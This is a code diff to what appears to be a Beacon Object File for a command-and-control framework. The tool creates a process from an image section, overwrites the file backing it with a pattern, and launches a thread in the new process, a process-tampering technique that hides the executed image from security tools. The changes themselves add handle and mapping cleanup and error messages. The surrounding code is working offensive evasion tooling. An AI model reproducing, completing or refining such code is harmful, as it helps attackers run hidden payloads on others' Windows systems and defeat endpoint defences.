@@ -569,6 +569,7 @@ WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lp
 WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
 WINBASEAPI LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
+WINBASEAPI WINBOOL WINAPI KERNEL32$UnmapViewOfFile(LPCVOID lpBaseAddress);
 NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateThreadEx(
     PHANDLE ThreadHandle,
     ACCESS_MASK DesiredAccess,
@@ -651,12 +652,16 @@ BOOL GetImageEntryPointRva(HANDLE FileHandle,DWORD * EntryPointRva){
     if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
     {
         BeaconPrintf(CALLBACK_ERROR, "[-] DOS_HEADER invalid signature");
+        KERNEL32$UnmapViewOfFile(view);
+        KERNEL32$CloseHandle(mapping);
         return FALSE;
     }
     PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((LPBYTE)view + dosHeader->e_lfanew);
     if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
     {
         BeaconPrintf(CALLBACK_ERROR, "[-] NT_HEADER invalid signature");
+        KERNEL32$UnmapViewOfFile(view);
+        KERNEL32$CloseHandle(mapping);
         return FALSE;
     }
 
@@ -668,7 +673,9 @@ BOOL GetImageEntryPointRva(HANDLE FileHandle,DWORD * EntryPointRva){
     {
         PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)(ntHeader);
         *EntryPointRva = ntHeader64->OptionalHeader.AddressOfEntryPoint;
-    }    
+    }
+    KERNEL32$UnmapViewOfFile(view);
+    KERNEL32$CloseHandle(mapping);    
     return TRUE;
 }
 
@@ -889,8 +896,9 @@ void go(char* buff, int len) {
         NULL,
         NULL,
         0);
-
-    KERNEL32$CloseHandle(sectionHandle);
+    if(!KERNEL32$CloseHandle(sectionHandle)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close sectionHandle\n");
+    }
 
     if (res != NT_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] NtCreateProcessEx failed. processHandle: 0x%p\n",processHandle);
@@ -908,6 +916,7 @@ void go(char* buff, int len) {
     int patternLength = 4;
     
     if(!OverwriteFileContentsWithPattern(targetFileHandle, (PBYTE)(&(pattern[0])), patternLength)){
+        KERNEL32$CloseHandle(processHandle);
         KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
@@ -922,14 +931,16 @@ void go(char* buff, int len) {
     if (status != NT_SUCCESS)
     {
         BeaconPrintf(CALLBACK_OUTPUT, "Failed to query new process info\n");
+        KERNEL32$CloseHandle(processHandle);
         KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
     PEB peb;
 
     if (!KERNEL32$ReadProcessMemory(processHandle, (LPCVOID)pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), (SIZE_T *)NULL)) {
-        KERNEL32$CloseHandle(targetFileHandle);
         BeaconPrintf(CALLBACK_OUTPUT, "Failed to get target PEB\n");
+        KERNEL32$CloseHandle(processHandle);
+        KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
     BeaconPrintf(CALLBACK_OUTPUT,
@@ -948,6 +959,7 @@ void go(char* buff, int len) {
         L"WinSta0\\Default",
         L"",
         L"")){
+            KERNEL32$CloseHandle(processHandle);
             KERNEL32$CloseHandle(targetFileHandle);
             return;
         }
@@ -972,9 +984,21 @@ void go(char* buff, int len) {
     }
     else {
         BeaconPrintf(CALLBACK_OUTPUT, "failed ntCreateThreadEx. ThreadHandle: 0x%p\n", threadHandle);
+        KERNEL32$CloseHandle(processHandle);
         KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
-    KERNEL32$CloseHandle(targetFileHandle);
+    if(!KERNEL32$CloseHandle(threadHandle)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close threadHandle\n");
+        
+    }
+    if(!KERNEL32$CloseHandle(processHandle)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close processHandle\n");
+        
+    }
+    if(!KERNEL32$CloseHandle(targetFileHandle)){
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close targetFileHandle\n");
+    }
+    return;
 
 }
